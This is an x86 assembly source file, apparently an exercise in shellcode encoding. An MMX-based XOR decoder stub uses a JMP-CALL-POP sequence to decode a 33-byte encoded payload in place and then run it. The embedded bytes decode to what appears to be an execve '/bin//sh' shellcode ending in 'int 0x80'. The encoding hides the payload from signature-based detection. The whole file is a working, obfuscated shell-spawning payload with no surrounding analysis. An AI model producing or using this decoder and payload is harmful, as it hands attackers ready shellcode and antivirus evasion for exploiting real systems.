global _start

section .text
_start:
    xor ecx, ecx
    mov cl, 0x2

CreateEncodingBytes:
    push 0xaaaaaaaa
    loop CreateEncodingBytes
    mov edx, esp

    ; Clear mm1
    pxor mm1, mm1

    ; Move 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa
    ; into mm1
    movq mm1, QWORD [edx]

    ; Jump to decoding now
    jmp short Call_ShellCode


ShellCodeDecoder:
    pop ebx

    ; Clear mm0
    pxor mm0, mm0

    ; Number of iterations: 5 ( 4 + 1 ) ( 33 bytes shellcode / 8 bytes block size) 
    xor ecx, ecx
    mov cl, 0x05

ShellCodeDecode:

    ; mov part of encoded shellcode into mm0
    movq mm0, QWORD [ebx]
    ; XOR Decode
    pxor mm0, mm1
    ; mov the decoded shellcode back to its location
    movq QWORD [ebx], mm0
    ; Increment ebx to point to next part of encoded shellcode
    add ebx, 0x08
    ; Loop decode
    loop ShellCodeDecode

    ; Once decoding is done, jump to EncodedShellCode
    jmp EncodedShellCode


Call_ShellCode:
    call ShellCodeDecoder
    EncodedShellCode: db 0x9b,0x78,0xf8,0x23,0x48,0x9b,0x63,0xfb,0x23,0x4b,0x9b,0x71,0xf9,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0x23,0xb3,0x9b,0x6a,0x1a,0xa1,0x67,0x2a